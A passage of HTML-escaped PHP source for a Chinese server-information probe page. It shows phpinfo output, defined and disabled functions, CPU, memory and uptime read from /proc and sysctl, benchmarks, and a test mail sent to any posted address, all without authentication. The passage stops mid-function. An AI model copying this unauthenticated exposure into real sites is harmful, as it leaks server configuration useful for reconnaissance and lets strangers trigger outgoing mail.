if ($_GET[&#39;act&#39;] &#x3D;&#x3D; &quot;phpinfo&quot;) 
&#123;

	phpinfo();

	exit();

&#125; 
elseif($_POST[&#39;act&#39;] &#x3D;&#x3D; &quot;整型测试&quot;)
&#123;

	$valInt &#x3D; test_int();

&#125; 
elseif($_POST[&#39;act&#39;] &#x3D;&#x3D; &quot;浮点测试&quot;)
&#123;

	$valFloat &#x3D; test_float();

&#125; 
elseif($_POST[&#39;act&#39;] &#x3D;&#x3D; &quot;IO测试&quot;)
&#123;

	$valIo &#x3D; test_io();

&#125; 
&#x2F;&#x2F;网速测试-开始
elseif($_POST[&#39;act&#39;]&#x3D;&#x3D;&quot;开始测试&quot;)
&#123;
?&gt;
	&lt;script language&#x3D;&quot;javascript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt;
		var acd1;
		acd1 &#x3D; new Date();
		acd1ok&#x3D;acd1.getTime();
	&lt;&#x2F;script&gt;
	&lt;?php
	for($i&#x3D;1;$i&lt;&#x3D;100000;$i++)
	&#123;
		echo &quot;&lt;!--567890#########0#########0#########0#########0#########0#########0#########0#########012345--&gt;&quot;;
	&#125;
	?&gt;
	&lt;script language&#x3D;&quot;javascript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt;
		var acd2;
		acd2 &#x3D; new Date();
		acd2ok&#x3D;acd2.getTime();
		window.location &#x3D; &#39;?speed&#x3D;&#39; +(acd2ok-acd1ok)+&#39;#w_networkspeed&#39;;
	&lt;&#x2F;script&gt;
&lt;?php
&#125;
&#x2F;&#x2F;网速测试-结束
elseif($_GET[&#39;act&#39;] &#x3D;&#x3D; &quot;Function&quot;)
&#123;
	$arr &#x3D; get_defined_functions();
	Function php()
	&#123;
	&#125;
	echo &quot;&lt;pre&gt;&quot;;
	Echo &quot;这里显示系统所支持的所有函数,和自定义函数\n&quot;;
	print_r($arr);
	echo &quot;&lt;&#x2F;pre&gt;&quot;;
	exit();
&#125;elseif($_GET[&#39;act&#39;] &#x3D;&#x3D; &quot;disable_functions&quot;)
&#123;
	$disFuns&#x3D;get_cfg_var(&quot;disable_functions&quot;);
	if(empty($disFuns))
	&#123;
		$arr &#x3D; &#39;&lt;font color&#x3D;red&gt;×&lt;&#x2F;font&gt;&#39;;
	&#125;
	else
	&#123; 
		$arr &#x3D; $disFuns;
	&#125;
	Function php()
	&#123;
	&#125;
	echo &quot;&lt;pre&gt;&quot;;
	Echo &quot;这里显示系统被禁用的函数\n&quot;;
	print_r($arr);
	echo &quot;&lt;&#x2F;pre&gt;&quot;;
	exit();
&#125;



&#x2F;&#x2F;MySQL检测

if ($_POST[&#39;act&#39;] &#x3D;&#x3D; &#39;MySQL检测&#39;)
&#123;

	$host &#x3D; isset($_POST[&#39;host&#39;]) ? trim($_POST[&#39;host&#39;]) : &#39;&#39;;

	$port &#x3D; isset($_POST[&#39;port&#39;]) ? (int) $_POST[&#39;port&#39;] : &#39;&#39;;

	$login &#x3D; isset($_POST[&#39;login&#39;]) ? trim($_POST[&#39;login&#39;]) : &#39;&#39;;

	$password &#x3D; isset($_POST[&#39;password&#39;]) ? trim($_POST[&#39;password&#39;]) : &#39;&#39;;

	$host &#x3D; preg_match(&#39;~[^a-z0-9\-\.]+~i&#39;, $host) ? &#39;&#39; : $host;

	$port &#x3D; intval($port) ? intval($port) : &#39;&#39;;

	$login &#x3D; preg_match(&#39;~[^a-z0-9\_\-]+~i&#39;, $login) ? &#39;&#39; : htmlspecialchars($login);

	$password &#x3D; is_string($password) ? htmlspecialchars($password) : &#39;&#39;;

&#125;
elseif ($_POST[&#39;act&#39;] &#x3D;&#x3D; &#39;函数检测&#39;)
&#123;

	$funRe &#x3D; &quot;函数&quot;.$_POST[&#39;funName&#39;].&quot;支持状况检测结果：&quot;.isfun1($_POST[&#39;funName&#39;]);

&#125; 
elseif ($_POST[&#39;act&#39;] &#x3D;&#x3D; &#39;邮件检测&#39;)
&#123;

	$mailRe &#x3D; &quot;邮件发送检测结果：发送&quot;;
	if($_SERVER[&#39;SERVER_PORT&#39;]&#x3D;&#x3D;80)&#123;$mailContent &#x3D; &quot;http:&#x2F;&#x2F;&quot;.$_SERVER[&#39;SERVER_NAME&#39;].($_SERVER[&#39;PHP_SELF&#39;] ? $_SERVER[&#39;PHP_SELF&#39;] : $_SERVER[&#39;SCRIPT_NAME&#39;]);&#125;
	else&#123;$mailContent &#x3D; &quot;http:&#x2F;&#x2F;&quot;.$_SERVER[&#39;SERVER_NAME&#39;].&quot;:&quot;.$_SERVER[&#39;SERVER_PORT&#39;].($_SERVER[&#39;PHP_SELF&#39;] ? $_SERVER[&#39;PHP_SELF&#39;] : $_SERVER[&#39;SCRIPT_NAME&#39;]);&#125;
	$mailRe .&#x3D; (false !&#x3D;&#x3D; @mail($_POST[&quot;mailAdd&quot;], $mailContent, &quot;This is a test mail!&quot;)) ? &quot;完成&quot;:&quot;失败&quot;;

&#125;


&#x2F;&#x2F;网络速度测试
if(isset($_POST[&#39;speed&#39;]))
&#123;
	$speed&#x3D;round(100&#x2F;($_POST[&#39;speed&#39;]&#x2F;1000),2);
&#125;
elseif($_GET[&#39;speed&#39;]&#x3D;&#x3D;&quot;0&quot;)
&#123;
	$speed&#x3D;6666.67;
&#125;
elseif(isset($_GET[&#39;speed&#39;]) and $_GET[&#39;speed&#39;]&gt;0)
&#123;
	$speed&#x3D;round(100&#x2F;($_GET[&#39;speed&#39;]&#x2F;1000),2); &#x2F;&#x2F;下载速度：$speed kb&#x2F;s
&#125;
else
&#123;
	$speed&#x3D;&quot;&lt;font color&#x3D;\&quot;red\&quot;&gt;&amp;nbsp;未探测&amp;nbsp;&lt;&#x2F;font&gt;&quot;;
&#125;	
	
	

&#x2F;&#x2F; 检测函数支持

function isfun($funName &#x3D; &#39;&#39;)
&#123;

    if (!$funName || trim($funName) &#x3D;&#x3D; &#39;&#39; || preg_match(&#39;~[^a-z0-9\_]+~i&#39;, $funName, $tmp)) return &#39;错误&#39;;

	return (false !&#x3D;&#x3D; function_exists($funName)) ? &#39;&lt;font color&#x3D;&quot;green&quot;&gt;√&lt;&#x2F;font&gt;&#39; : &#39;&lt;font color&#x3D;&quot;red&quot;&gt;×&lt;&#x2F;font&gt;&#39;;
&#125;
function isfun1($funName &#x3D; &#39;&#39;)
&#123;
    if (!$funName || trim($funName) &#x3D;&#x3D; &#39;&#39; || preg_match(&#39;~[^a-z0-9\_]+~i&#39;, $funName, $tmp)) return &#39;错误&#39;;
	return (false !&#x3D;&#x3D; function_exists($funName)) ? &#39;√&#39; : &#39;×&#39;;
&#125;



&#x2F;&#x2F;整数运算能力测试

function test_int()
&#123;

	$timeStart &#x3D; gettimeofday();

	for($i &#x3D; 0; $i &lt; 3000000; $i++)
	&#123;

		$t &#x3D; 1+1;

	&#125;

	$timeEnd &#x3D; gettimeofday();

	$time &#x3D; ($timeEnd[&quot;usec&quot;]-$timeStart[&quot;usec&quot;])&#x2F;1000000+$timeEnd[&quot;sec&quot;]-$timeStart[&quot;sec&quot;];

	$time &#x3D; round($time, 3).&quot;秒&quot;;

	return $time;

&#125;



&#x2F;&#x2F;浮点运算能力测试

function test_float()
&#123;

	&#x2F;&#x2F;得到圆周率值

	$t &#x3D; pi();

	$timeStart &#x3D; gettimeofday();



	for($i &#x3D; 0; $i &lt; 3000000; $i++)
	&#123;

		&#x2F;&#x2F;开平方

		sqrt($t);

	&#125;



	$timeEnd &#x3D; gettimeofday();

	$time &#x3D; ($timeEnd[&quot;usec&quot;]-$timeStart[&quot;usec&quot;])&#x2F;1000000+$timeEnd[&quot;sec&quot;]-$timeStart[&quot;sec&quot;];

	$time &#x3D; round($time, 3).&quot;秒&quot;;

	return $time;

&#125;



&#x2F;&#x2F;IO能力测试

function test_io()
&#123;

	$fp &#x3D; @fopen(PHPSELF, &quot;r&quot;);

	$timeStart &#x3D; gettimeofday();

	for($i &#x3D; 0; $i &lt; 10000; $i++) 
	&#123;

		@fread($fp, 10240);

		@rewind($fp);

	&#125;

	$timeEnd &#x3D; gettimeofday();

	@fclose($fp);

	$time &#x3D; ($timeEnd[&quot;usec&quot;]-$timeStart[&quot;usec&quot;])&#x2F;1000000+$timeEnd[&quot;sec&quot;]-$timeStart[&quot;sec&quot;];

	$time &#x3D; round($time, 3).&quot;秒&quot;;

	return($time);

&#125;

function GetCoreInformation() &#123;$data &#x3D; file(&#39;&#x2F;proc&#x2F;stat&#39;);$cores &#x3D; array();foreach( $data as $line ) &#123;if( preg_match(&#39;&#x2F;^cpu[0-9]&#x2F;&#39;, $line) )&#123;$info &#x3D; explode(&#39; &#39;, $line);$cores[]&#x3D;array(&#39;user&#39;&#x3D;&gt;$info[1],&#39;nice&#39;&#x3D;&gt;$info[2],&#39;sys&#39; &#x3D;&gt; $info[3],&#39;idle&#39;&#x3D;&gt;$info[4],&#39;iowait&#39;&#x3D;&gt;$info[5],&#39;irq&#39; &#x3D;&gt; $info[6],&#39;softirq&#39; &#x3D;&gt; $info[7]);&#125;&#125;return $cores;&#125;
function GetCpuPercentages($stat1, $stat2) &#123;if(count($stat1)!&#x3D;&#x3D;count($stat2))&#123;return;&#125;$cpus&#x3D;array();for( $i &#x3D; 0, $l &#x3D; count($stat1); $i &lt; $l; $i++) &#123;	$dif &#x3D; array();	$dif[&#39;user&#39;] &#x3D; $stat2[$i][&#39;user&#39;] - $stat1[$i][&#39;user&#39;];$dif[&#39;nice&#39;] &#x3D; $stat2[$i][&#39;nice&#39;] - $stat1[$i][&#39;nice&#39;];	$dif[&#39;sys&#39;] &#x3D; $stat2[$i][&#39;sys&#39;] - $stat1[$i][&#39;sys&#39;];$dif[&#39;idle&#39;] &#x3D; $stat2[$i][&#39;idle&#39;] - $stat1[$i][&#39;idle&#39;];$dif[&#39;iowait&#39;] &#x3D; $stat2[$i][&#39;iowait&#39;] - $stat1[$i][&#39;iowait&#39;];$dif[&#39;irq&#39;] &#x3D; $stat2[$i][&#39;irq&#39;] - $stat1[$i][&#39;irq&#39;];$dif[&#39;softirq&#39;] &#x3D; $stat2[$i][&#39;softirq&#39;] - $stat1[$i][&#39;softirq&#39;];$total &#x3D; array_sum($dif);$cpu &#x3D; array();foreach($dif as $x&#x3D;&gt;$y) $cpu[$x] &#x3D; round($y &#x2F; $total * 100, 2);$cpus[&#39;cpu&#39; . $i] &#x3D; $cpu;&#125;return $cpus;&#125;
$stat1 &#x3D; GetCoreInformation();sleep(1);$stat2 &#x3D; GetCoreInformation();$data &#x3D; GetCpuPercentages($stat1, $stat2);
$cpu_show &#x3D; $data[&#39;cpu0&#39;][&#39;user&#39;].&quot;%us,  &quot;.$data[&#39;cpu0&#39;][&#39;sys&#39;].&quot;%sy,  &quot;.$data[&#39;cpu0&#39;][&#39;nice&#39;].&quot;%ni, &quot;.$data[&#39;cpu0&#39;][&#39;idle&#39;].&quot;%id,  &quot;.$data[&#39;cpu0&#39;][&#39;iowait&#39;].&quot;%wa,  &quot;.$data[&#39;cpu0&#39;][&#39;irq&#39;].&quot;%irq,  &quot;.$data[&#39;cpu0&#39;][&#39;softirq&#39;].&quot;%softirq&quot;;
function makeImageUrl($title, $data) &#123;$api&#x3D;&#39;http:&#x2F;&#x2F;api.yahei.net&#x2F;tz&#x2F;cpu_show.php?id&#x3D;&#39;;$url.&#x3D;$data[&#39;user&#39;].&#39;,&#39;;$url.&#x3D;$data[&#39;nice&#39;].&#39;,&#39;;$url.&#x3D;$data[&#39;sys&#39;].&#39;,&#39;;$url.&#x3D;$data[&#39;idle&#39;].&#39;,&#39;;$url.&#x3D;$data[&#39;iowait&#39;];$url.&#x3D;&#39;&amp;chdl&#x3D;User|Nice|Sys|Idle|Iowait&amp;chdlp&#x3D;b&amp;chl&#x3D;&#39;;$url.&#x3D;$data[&#39;user&#39;].&#39;%25|&#39;;$url.&#x3D;$data[&#39;nice&#39;].&#39;%25|&#39;;$url.&#x3D;$data[&#39;sys&#39;].&#39;%25|&#39;;$url.&#x3D;$data[&#39;idle&#39;].&#39;%25|&#39;;$url.&#x3D;$data[&#39;iowait&#39;].&#39;%25&#39;;$url.&#x3D;&#39;&amp;chtt&#x3D;Core+&#39;.$title;return $api.base64_encode($url);&#125;
if($_GET[&#39;act&#39;] &#x3D;&#x3D; &quot;cpu_percentage&quot;)&#123;echo &quot;&lt;center&gt;&lt;b&gt;&lt;font face&#x3D;&#39;Microsoft YaHei&#39; color&#x3D;&#39;#666666&#39; size&#x3D;&#39;3&#39;&gt;图片加载慢，请耐心等待！&lt;&#x2F;font&gt;&lt;&#x2F;b&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&quot;;foreach( $data as $k &#x3D;&gt; $v ) &#123;echo &#39;&lt;img src&#x3D;&quot;&#39; . makeImageUrl( $k, $v ) . &#39;&quot; style&#x3D;&quot;width:360px;height:240px;border: #CCCCCC 1px solid;background: #FFFFFF;margin:5px;padding:5px;&quot; &#x2F;&gt;&#39;;&#125;echo &quot;&lt;&#x2F;center&gt;&quot;;exit();&#125;



&#x2F;&#x2F; 根据不同系统取得CPU相关信息

switch(PHP_OS)
&#123;

	case &quot;Linux&quot;:

		$sysReShow &#x3D; (false !&#x3D;&#x3D; ($sysInfo &#x3D; sys_linux()))?&quot;show&quot;:&quot;none&quot;;

	break;
	

	case &quot;FreeBSD&quot;:

		$sysReShow &#x3D; (false !&#x3D;&#x3D; ($sysInfo &#x3D; sys_freebsd()))?&quot;show&quot;:&quot;none&quot;;

	break;
&#x2F;*	

	case &quot;WINNT&quot;:

		$sysReShow &#x3D; (false !&#x3D;&#x3D; ($sysInfo &#x3D; sys_windows()))?&quot;show&quot;:&quot;none&quot;;

	break;
*&#x2F;	

	default:

	break;

&#125;



&#x2F;&#x2F;linux系统探测

function sys_linux()

&#123;

    &#x2F;&#x2F; CPU

    if (false &#x3D;&#x3D;&#x3D; ($str &#x3D; @file(&quot;&#x2F;proc&#x2F;cpuinfo&quot;))) return false;

    $str &#x3D; implode(&quot;&quot;, $str);

    @preg_match_all(&quot;&#x2F;model\s+name\s&#123;0,&#125;\:+\s&#123;0,&#125;([\w\s\)\(\@.-]+)([\r\n]+)&#x2F;s&quot;, $str, $model);

    @preg_match_all(&quot;&#x2F;cpu\s+MHz\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+)[\r\n]+&#x2F;&quot;, $str, $mhz);

    @preg_match_all(&quot;&#x2F;cache\s+size\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+\s&#123;0,&#125;[A-Z]+[\r\n]+)&#x2F;&quot;, $str, $cache);

    @preg_match_all(&quot;&#x2F;bogomips\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+)[\r\n]+&#x2F;&quot;, $str, $bogomips);

    if (false !&#x3D;&#x3D; is_array($model[1]))

	&#123;

        $res[&#39;cpu&#39;][&#39;num&#39;] &#x3D; sizeof($model[1]);
		&#x2F;*

        for($i &#x3D; 0; $i &lt; $res[&#39;cpu&#39;][&#39;num&#39;]; $i++)

        &#123;

            $res[&#39;cpu&#39;][&#39;model&#39;][] &#x3D; $model[1][$i].&#39;&amp;nbsp;(&#39;.$mhz[1][$i].&#39;)&#39;;

            $res[&#39;cpu&#39;][&#39;mhz&#39;][] &#x3D; $mhz[1][$i];

            $res[&#39;cpu&#39;][&#39;cache&#39;][] &#x3D; $cache[1][$i];

            $res[&#39;cpu&#39;][&#39;bogomips&#39;][] &#x3D; $bogomips[1][$i];

        &#125;*&#x2F;
		if($res[&#39;cpu&#39;][&#39;num&#39;]&#x3D;&#x3D;1)
			$x1 &#x3D; &#39;&#39;;
		else
			$x1 &#x3D; &#39; ×&#39;.$res[&#39;cpu&#39;][&#39;num&#39;];
		$mhz[1][0] &#x3D; &#39; | 频率:&#39;.$mhz[1][0];
		$cache[1][0] &#x3D; &#39; | 二级缓存:&#39;.$cache[1][0];
		$bogomips[1][0] &#x3D; &#39; | Bogomips:&#39;.$bogomips[1][0];
		$res[&#39;cpu&#39;][&#39;model&#39;][] &#x3D; $model[1][0].$mhz[1][0].$cache[1][0].$bogomips[1][0].$x1;

        if (false !&#x3D;&#x3D; is_array($res[&#39;cpu&#39;][&#39;model&#39;])) $res[&#39;cpu&#39;][&#39;model&#39;] &#x3D; implode(&quot;&lt;br &#x2F;&gt;&quot;, $res[&#39;cpu&#39;][&#39;model&#39;]);

        if (false !&#x3D;&#x3D; is_array($res[&#39;cpu&#39;][&#39;mhz&#39;])) $res[&#39;cpu&#39;][&#39;mhz&#39;] &#x3D; implode(&quot;&lt;br &#x2F;&gt;&quot;, $res[&#39;cpu&#39;][&#39;mhz&#39;]);

        if (false !&#x3D;&#x3D; is_array($res[&#39;cpu&#39;][&#39;cache&#39;])) $res[&#39;cpu&#39;][&#39;cache&#39;] &#x3D; implode(&quot;&lt;br &#x2F;&gt;&quot;, $res[&#39;cpu&#39;][&#39;cache&#39;]);

        if (false !&#x3D;&#x3D; is_array($res[&#39;cpu&#39;][&#39;bogomips&#39;])) $res[&#39;cpu&#39;][&#39;bogomips&#39;] &#x3D; implode(&quot;&lt;br &#x2F;&gt;&quot;, $res[&#39;cpu&#39;][&#39;bogomips&#39;]);

	&#125;


    &#x2F;&#x2F; NETWORK


    &#x2F;&#x2F; UPTIME

    if (false &#x3D;&#x3D;&#x3D; ($str &#x3D; @file(&quot;&#x2F;proc&#x2F;uptime&quot;))) return false;

    $str &#x3D; explode(&quot; &quot;, implode(&quot;&quot;, $str));

    $str &#x3D; trim($str[0]);

    $min &#x3D; $str &#x2F; 60;

    $hours &#x3D; $min &#x2F; 60;

    $days &#x3D; floor($hours &#x2F; 24);

    $hours &#x3D; floor($hours - ($days * 24));

    $min &#x3D; floor($min - ($days * 60 * 24) - ($hours * 60));

    if ($days !&#x3D;&#x3D; 0) $res[&#39;uptime&#39;] &#x3D; $days.&quot;天&quot;;

    if ($hours !&#x3D;&#x3D; 0) $res[&#39;uptime&#39;] .&#x3D; $hours.&quot;小时&quot;;

    $res[&#39;uptime&#39;] .&#x3D; $min.&quot;分钟&quot;;


    &#x2F;&#x2F; MEMORY

    if (false &#x3D;&#x3D;&#x3D; ($str &#x3D; @file(&quot;&#x2F;proc&#x2F;meminfo&quot;))) return false;

    $str &#x3D; implode(&quot;&quot;, $str);

    preg_match_all(&quot;&#x2F;MemTotal\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+).+?MemFree\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+).+?Cached\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+).+?SwapTotal\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+).+?SwapFree\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+)&#x2F;s&quot;, $str, $buf);
	preg_match_all(&quot;&#x2F;Buffers\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+)&#x2F;s&quot;, $str, $buffers);


    $res[&#39;memTotal&#39;] &#x3D; round($buf[1][0]&#x2F;1024, 2);

    $res[&#39;memFree&#39;] &#x3D; round($buf[2][0]&#x2F;1024, 2);

    $res[&#39;memBuffers&#39;] &#x3D; round($buffers[1][0]&#x2F;1024, 2);
	$res[&#39;memCached&#39;] &#x3D; round($buf[3][0]&#x2F;1024, 2);

    $res[&#39;memUsed&#39;] &#x3D; $res[&#39;memTotal&#39;]-$res[&#39;memFree&#39;];

    $res[&#39;memPercent&#39;] &#x3D; (floatval($res[&#39;memTotal&#39;])!&#x3D;0)?round($res[&#39;memUsed&#39;]&#x2F;$res[&#39;memTotal&#39;]*100,2):0;


    $res[&#39;memRealUsed&#39;] &#x3D; $res[&#39;memTotal&#39;] - $res[&#39;memFree&#39;] - $res[&#39;memCached&#39;] - $res[&#39;memBuffers&#39;]; &#x2F;&#x2F;真实内存使用
	$res[&#39;memRealFree&#39;] &#x3D; $res[&#39;memTotal&#39;] - $res[&#39;memRealUsed&#39;]; &#x2F;&#x2F;真实空闲
    $res[&#39;memRealPercent&#39;] &#x3D; (floatval($res[&#39;memTotal&#39;])!&#x3D;0)?round($res[&#39;memRealUsed&#39;]&#x2F;$res[&#39;memTotal&#39;]*100,2):0; &#x2F;&#x2F;真实内存使用率

	$res[&#39;memCachedPercent&#39;] &#x3D; (floatval($res[&#39;memCached&#39;])!&#x3D;0)?round($res[&#39;memCached&#39;]&#x2F;$res[&#39;memTotal&#39;]*100,2):0; &#x2F;&#x2F;Cached内存使用率

    $res[&#39;swapTotal&#39;] &#x3D; round($buf[4][0]&#x2F;1024, 2);

    $res[&#39;swapFree&#39;] &#x3D; round($buf[5][0]&#x2F;1024, 2);

    $res[&#39;swapUsed&#39;] &#x3D; round($res[&#39;swapTotal&#39;]-$res[&#39;swapFree&#39;], 2);

    $res[&#39;swapPercent&#39;] &#x3D; (floatval($res[&#39;swapTotal&#39;])!&#x3D;0)?round($res[&#39;swapUsed&#39;]&#x2F;$res[&#39;swapTotal&#39;]*100,2):0;


    &#x2F;&#x2F; LOAD AVG

    if (false &#x3D;&#x3D;&#x3D; ($str &#x3D; @file(&quot;&#x2F;proc&#x2F;loadavg&quot;))) return false;

    $str &#x3D; explode(&quot; &quot;, implode(&quot;&quot;, $str));

    $str &#x3D; array_chunk($str, 4);

    $res[&#39;loadAvg&#39;] &#x3D; implode(&quot; &quot;, $str[0]);


    return $res;

&#125;



&#x2F;&#x2F;FreeBSD系统探测

function sys_freebsd()
&#123;

	&#x2F;&#x2F;CPU

	if (false &#x3D;&#x3D;&#x3D; ($res[&#39;cpu&#39;][&#39;num&#39;] &#x3D; get_key(&quot;hw.ncpu&quot;))) return false;

	$res[&#39;cpu&#39;][&#39;model&#39;] &#x3D; get_key(&quot;hw.model&quot;);

	&#x2F;&#x2F;LOAD AVG

	if (false &#x3D;&#x3D;&#x3D; ($res[&#39;loadAvg&#39;] &#x3D; get_key(&quot;vm.loadavg&quot;))) return false;

	&#x2F;&#x2F;UPTIME

	if (false &#x3D;&#x3D;&#x3D; ($buf &#x3D; get_key(&quot;kern.boottime&quot;))) return false;

	$buf &#x3D; explode(&#39; &#39;, $buf);

	$sys_ticks &#x3D; time() - intval($buf[3]);

	$min &#x3D; $sys_ticks &#x2F; 60;

	$hours &#x3D; $min &#x2F; 60;

	$days &#x3D; floor($hours &#x2F; 24);

	$hours &#x3D; floor($hours - ($days * 24));

	$min &#x3D; floor($min - ($days * 60 * 24) - ($hours * 60));

	if ($days !&#x3D;&#x3D; 0) $res[&#39;uptime&#39;] &#x3D; $days.&quot;天&quot;;

	if ($hours !&#x3D;&#x3D; 0) $res[&#39;uptime&#39;] .&#x3D; $hours.&quot;小时&quot;;

	$res[&#39;uptime&#39;] .&#x3D; $min.&quot;分钟&quot;;

	&#x2F;&#x2F;MEMORY

	if (false &#x3D;&#x3D;&#x3D; ($buf &#x3D; get_key(&quot;hw.physmem&quot;))) return false;

	$res[&#39;memTotal&#39;] &#x3D; round($buf&#x2F;1024&#x2F;1024, 2);


	$str &#x3D; get_key(&quot;vm.vmtotal&quot;);

	preg_match_all(&quot;&#x2F;\nVirtual Memory[\:\s]*\(Total[\:\s]*([\d]+)K[\,\s]*Active[\:\s]*([\d]+)K\)\n&#x2F;i&quot;, $str, $buff, PREG_SET_ORDER);

	preg_match_all(&quot;&#x2F;\nReal Memory[\:\s]*\(Total[\:\s]*([\d]+)K[\,\s]*Active[\:\s]*([\d]+)K\)\n&#x2F;i&quot;, $str, $buf, PREG_SET_ORDER);


	$res[&#39;memRealUsed&#39;] &#x3D; round($buf[0][2]&#x2F;1024, 2);

	$res[&#39;memCached&#39;] &#x3D; round($buff[0][2]&#x2F;1024, 2);

	$res[&#39;memUsed&#39;] &#x3D; round($buf[0][1]&#x2F;1024, 2) + $res[&#39;memCached&#39;];

	$res[&#39;memFree&#39;] &#x3D; $res[&#39;memTotal&#39;] - $res[&#39;memUsed&#39;];

	$res[&#39;memPercent&#39;] &#x3D; (floatval($res[&#39;memTotal&#39;])!&#x3D;0)?round($res[&#39;memUsed&#39;]&#x2F;$res[&#39;memTotal&#39;]*100,2):0;


	$res[&#39;memRealPercent&#39;] &#x3D; (floatval($res[&#39;memTotal&#39;])!&#x3D;0)?round($res[&#39;memRealUsed&#39;]&#x2F;$res[&#39;memTotal&#39;]*100,2):0;


	return $res;

&#125;



&#x2F;&#x2F;取得参数值 FreeBSD

function get_key($keyName)
&#123;

	return do_command(&#39;sysctl&#39;, &quot;-n $keyName&quot;);

&#125;



&#x2F;&#x2F;确定执行文件位置 FreeBSD

function find_command($commandName)
&#123;

	$path &#x3D; array(&#39;&#x2F;bin&#39;, &#39;&#x2F;sbin&#39;, &#39;&#x2F;usr&#x2F;bin&#39;, &#39;&#x2F;usr&#x2F;sbin&#39;, &#39;&#x2F;usr&#x2F;local&#x2F;bin&#39;, &#39;&#x2F;usr&#x2F;local&#x2F;sbin&#39;);

	foreach($path as $p) 
	&#123;

		if (@is_executable(&quot;$p&#x2F;$commandName&quot;)) return &quot;$p&#x2F;$commandName&quot;;

	&#125;

	return false;

&#125;



&#x2F;&#x2F;执行系统命令 FreeBSD

function do_command($commandName, $args)
&#123;

	$buffer &#x3D; &quot;&quot;;

	if (false &#x3D;&#x3D;&#x3D; ($command &#x3D; find_command($commandName))) return false;

	if ($fp &#x3D; @popen(&quot;$command $args&quot;, &#39;r&#39;)) 
	&#123;

		while (!@feof($fp))
		&#123;

			$buffer .&#x3D; @fgets($fp, 4096);

		&#125;

		return trim($buffer);

	&#125;

	return false;

&#125;



&#x2F;&#x2F;windows系统探测

function sys_windows()
&#123;

	if (PHP_VERSION &gt;&#x3D; 5)
	&#123;

		$objLocator &#x3D; new COM(&quot;WbemScripting.SWbemLocator&quot;);

		$wmi &#x3D; $objLocator-&gt;ConnectServer();

		$prop &#x3D; $wmi-&gt;get(&quot;Win32_PnPEntity&quot;);

	&#125;
	else
	&#123;
		return false;

	&#125;



	&#x2F;&#x2F;CPU

	$cpuinfo &#x3D; GetWMI($wmi,&quot;Win32_Processor&quot;, array(&quot;Name&quot;,&quot;L2CacheSize&quot;,&quot;NumberOfCores&quot;));

	$res[&#39;cpu&#39;][&#39;num&#39;] &#x3D; $cpuinfo[0][&#39;NumberOfCores&#39;];

	if (null &#x3D;&#x3D; $res[&#39;cpu&#39;][&#39;num&#39;]) 
	&#123;

		$res[&#39;cpu&#39;][&#39;num&#39;] &#x3D; 1;

	&#125;&#x2F;*

	for ($i&#x3D;0;$i&lt;$res[&#39;cpu&#39;][&#39;num&#39;];$i++)
	&#123;

		$res[&#39;cpu&#39;][&#39;model&#39;] .&#x3D; $cpuinfo[0][&#39;Name&#39;].&quot;&lt;br &#x2F;&gt;&quot;;

		$res[&#39;cpu&#39;][&#39;cache&#39;] .&#x3D; $cpuinfo[0][&#39;L2CacheSize&#39;].&quot;&lt;br &#x2F;&gt;&quot;;

	&#125;*&#x2F;
	$cpuinfo[0][&#39;L2CacheSize&#39;] &#x3D; &#39; (&#39;.$cpuinfo[0][&#39;L2CacheSize&#39;].&#39;)&#39;;
	if($res[&#39;cpu&#39;][&#39;num&#39;]&#x3D;&#x3D;1)
		$x1 &#x3D; &#39;&#39;;
	else
		$x1 &#x3D; &#39; ×&#39;.$res[&#39;cpu&#39;][&#39;num&#39;];
	$res[&#39;cpu&#39;][&#39;model&#39;] &#x3D; $cpuinfo[0][&#39;Name&#39;].$cpuinfo[0][&#39;L2CacheSize&#39;].$x1;

	&#x2F;&#x2F; SYSINFO

	$sysinfo &#x3D; GetWMI($wmi,&quot;Win32_OperatingSystem&quot;, array(&#39;LastBootUpTime&#39;,&#39;TotalVisibleMemorySize&#39;,&#39;FreePhysicalMemory&#39;,&#39;Caption&#39;,&#39;CSDVersion&#39;,&#39;SerialNumber&#39;,&#39;InstallDate&#39;));

	$sysinfo[0][&#39;Caption&#39;]&#x3D;iconv(&#39;GBK&#39;, &#39;UTF-8&#39;,$sysinfo[0][&#39;Caption&#39;]);

	$sysinfo[0][&#39;CSDVersion&#39;]&#x3D;iconv(&#39;GBK&#39;, &#39;UTF-8&#39;,$sysinfo[0][&#39;CSDVersion&#39;]);

	$res[&#39;win_n&#39;] &#x3D; $sysinfo[0][&#39;Caption&#39;].&quot; &quot;.$sysinfo[0][&#39;CSDVersion&#39;].&quot; 序列号:&#123;$sysinfo[0][&#39;SerialNumber&#39;]&#125; 于&quot;.date(&#39;Y年m月d日H:i:s&#39;,strtotime(substr($sysinfo[0][&#39;InstallDate&#39;],0,14))).&quot;安装&quot;;

	&#x2F;&#x2F;UPTIME

	$res[&#39;uptime&#39;] &#x3D; $sysinfo[0][&#39;LastBootUpTime&#39;];


	$sys_ticks &#x3D; 3600*8 + time() - strtotime(substr($res[&#39;uptime&#39;],0,14));

	$min &#x3D; $sys_ticks &#x2F; 60;

	$hours &#x3D; $min &#x2F; 60;

	$days &#x3D; floor($hours &#x2F; 24);

	$hours &#x3D; floor($hours - ($days * 24));

	$min &#x3D; floor($min - ($days * 60 * 24) - ($hours * 60));

	if ($days !&#x3D;&#x3D; 0) $res[&#39;uptime&#39;] &#x3D; $days.&quot;天&quot;;

	if ($hours !&#x3D;&#x3D; 0) $res[&#39;uptime&#39;] .&#x3D; $hours.&quot;小时&quot;;

	$res[&#39;uptime&#39;] .&#x3D; $min.&quot;分钟&quot;;


	&#x2F;&#x2F;MEMORY

	$res[&#39;memTotal&#39;] &#x3D; round($sysinfo[0][&#39;TotalVisibleMemorySize&#39;]&#x2F;1024,2);

	$res[&#39;memFree&#39;] &#x3D; round($sysinfo[0][&#39;FreePhysicalMemory&#39;]&#x2F;1024,2);

	$res[&#39;memUsed&#39;] &#x3D; $res[&#39;memTotal&#39;]-$res[&#39;memFree&#39;];	&#x2F;&#x2F;上面两行已经除以1024,这行不用再除了

